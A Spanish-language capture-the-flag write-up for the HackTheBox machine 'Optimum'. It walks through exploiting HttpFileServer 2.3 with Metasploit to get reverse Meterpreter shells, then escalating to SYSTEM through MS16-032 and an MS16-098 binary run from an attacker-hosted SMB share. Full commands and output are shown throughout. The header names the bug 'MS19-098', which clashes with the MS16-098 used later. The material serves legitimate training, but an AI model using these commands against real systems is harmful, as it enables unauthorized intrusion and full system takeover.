# Optimum

## Información

La máquina a comprometer es **Optimum** de **HackTheBox**.

![](/.gitbook/assets/Optimum.png)

Las técnicas vistas son:

* HFS 2.3 Vunerability
* MS19-098: Elevación de privilegios

## Enumeración

Comprobamos que la máquina este activa:
```bash
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ ping -c 1 10.10.10.8
PING 10.10.10.8 (10.10.10.8) 56(84) bytes of data.
64 bytes from 10.10.10.8: icmp_seq=1 ttl=127 time=109 ms

--- 10.10.10.8 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 108.686/108.686/108.686/0.000 ms

```

Vemos por la TTL que estamos ante una maquina Windows.

Realizamos un escaneo.

```bash
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.8 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 06:09 EST
Initiating SYN Stealth Scan at 06:09
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
Completed SYN Stealth Scan at 06:10, 26.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.8
Host is up, received user-set (0.12s latency).
Scanned at 2024-01-19 06:09:36 EST for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
           Raw packets sent: 131088 (5.768MB) | Rcvd: 26 (1.184KB)
                                                                                                                                                                                                              
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ nmap -sCV -p80 10.10.10.8 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-19 06:10 EST
Nmap scan report for 10.10.10.8
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.59 seconds
```

Vemos que solo está abierto el puerto 80 y que en principio se trata de un HttpFileServer en versión 2.3. Verificamos en la web:

![](/.gitbook/assets/optimum-hfs.png)

Una rápida búsqueda nos muestra que es un servicio vulnerable.

![](/.gitbook/assets/optimum-hfs1.png)

Realizaremos la explotación con metasploit y de forma manual.

## Metasploit

### Explotación

Arrancamos metasploit y buscamos exploit para HttpFileServer:

```bash
msf6 > search hfs

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 1
o[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):
```

Rellenamos opciones y ejecutamos:

```bash
[-] exploit: Interrupted
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
RHOSTS => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.35
LHOST => 10.10.14.35
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.35:4444 
[*] Using URL: http://10.10.14.35:8080/yC4XfgpQ
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /yC4XfgpQ
[*] Sending stage (175686 bytes) to 10.10.10.8
[*] Sending stage (175686 bytes) to 10.10.10.8
[!] Tried to delete %TEMP%\gsApTC.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.14.35:4444 -> 10.10.10.8:49262) at 2024-01-19 06:21:02 -0500
[*] Meterpreter session 2 opened (10.10.14.35:4444 -> 10.10.10.8:49253) at 2024-01-19 06:21:02 -0500
[*] Server stopped.

meterpreter > 
```
A por la flag:

```bash
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter > shell
Process 1812 created.
Channel 7 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
C:\Users\kostas\Desktop>type user.txt
type user.txt

```
### Escalada de privilegios

Previamente enumeramos el sistema para buscar una vía de escalar privilegios.

```bash

msf6 exploit(windows/http/rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > session -l
[-] Unknown command: session
msf6 post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.35:4444 -> 10.10.10.8:49262 (10.10.10.8)
  2         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.35:4444 -> 10.10.10.8:49253 (10.10.10.8)

msf6 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 190 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.8 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 7   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 8   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 9   exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 10  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
```

vemos que hay un exploit para la escalada de privilegios, **exploit/windows/local/ms16_032_secondary_logon_handle_privesc**, que puede funionar. Lo probamos:

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.168.143  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.35
LHOST => 10.10.14.35
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[-] Msf::OptionValidateError The following options failed to validate: SESSION
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 2
session => 2
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.14.35:4445 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\oBGxCB.ps1...
[*] Compressing script contents...
[+] Compressed size: 3737
[*] Executing exploit script...
	__ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                   
	              [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2376

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $ql = [Ntdll]::NtImpersonateThread($yT, $yT, [ref]$nN7P)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (nN7P:VariablePath) [], Runtim 
   eException
    + FullyQualifiedErrorId : NonExistingVariableReference
 
[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $ql = [Advapi32]::DuplicateToken($xAro, 2, [ref]$kuGw2)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
 
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

vlFMGGHhrxZ2rYvvF1pVUffKLHlrAwWB
[+] Executed on target machine.
[*] Sending stage (175686 bytes) to 10.10.10.8
[*] Meterpreter session 3 opened (10.10.14.35:4445 -> 10.10.10.8:49264) at 2024-01-19 06:31:19 -0500
[+] Deleted C:\Users\kostas\AppData\Local\Temp\oBGxCB.ps1

meterpreter > getsystem
[-] Already running as SYSTEM
meterpreter > shell
Process 1268 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>type ..\..\administrator\desktop\root.txt
type ..\..\administrator\desktop\root.txt


```

Ha funcionado.

## Manual

### Explotación

De la página de exploitdb nos descargamos el exploit:

![](/.gitbook/assets/optimum-hfs2.png)

Lo revisamos y modificamos:

![](/.gitbook/assets/optimum-hfs3.png)

Nos ponemos a la escucha y lanzamos el script. Previamente copiamos el fichero nc.exe y levantamos un servicio web.

![](/.gitbook/assets/optimum-hfs4.png)

Hemos entrado.

### Escalada de privilegios

Similar a la forma anterior, guardamos la salida de system  info y usamos **windows exploit suggester**.

```bash
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ git clone https://github.com/bitsadmin/wesng --depth 1
Cloning into 'wesng'...
remote: Enumerating objects: 86, done.
remote: Counting objects: 100% (86/86), done.
remote: Compressing objects: 100% (41/41), done.
remote: Total 86 (delta 47), reused 72 (delta 44), pack-reused 0
Receiving objects: 100% (86/86), 2.76 MiB | 6.19 MiB/s, done.
Resolving deltas: 100% (47/47), done.
                                                                                                                                    
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ cd wesng 
┌──(kali㉿kali)-[~/HTB/Optimum/wesng]
└─$ python wes.py ../systeminfo > resultados.txt
```

Vemos que hay varios CVEs que permiten escalar privilegios. Podemos probar la misma vulnerabilidad vista antreriomente:

![](/.gitbook/assets/optimum-hfs6.png)

Buscamos un exploit:

![](/.gitbook/assets/optimum-hfs8.png)

Probamos. Por un lado nos descargamos el exploit y nos ponemos a la escucha:

```bash
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ wget https://github.com/sensepost/ms16-098/raw/master/bfill.exe
--2024-01-19 07:57:28--  https://github.com/sensepost/ms16-098/raw/master/bfill.exe
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/sensepost/ms16-098/master/bfill.exe [following]
--2024-01-19 07:57:29--  https://raw.githubusercontent.com/sensepost/ms16-098/master/bfill.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 560128 (547K) [application/octet-stream]
Saving to: ‘bfill.exe’

bfill.exe                100%[=================================>] 547.00K  --.-KB/s    in 0.05s   

2024-01-19 07:57:29 (11.7 MB/s) - ‘bfill.exe’ saved [560128/560128]

                                                                                                   
┌──(kali㉿kali)-[~/HTB/Optimum]
└─$ impacket-smbserver smbFolder $(pwd) -smb2support               
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
Y ejecutamos directamente desde la consola obtenida anteriormente:

```cmd
C:\Users\kostas\Desktop>\\10.10.14.35\smbFolder\bfill.exe
\\10.10.14.35\smbFolder\bfill.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas

C:\Users\kostas\Desktop>\\10.10.14.35\smbFolder\bfill.exe
\\10.10.14.35\smbFolder\bfill.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>cd ..\..\Administrator\Desktop
cd ..\..\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
```

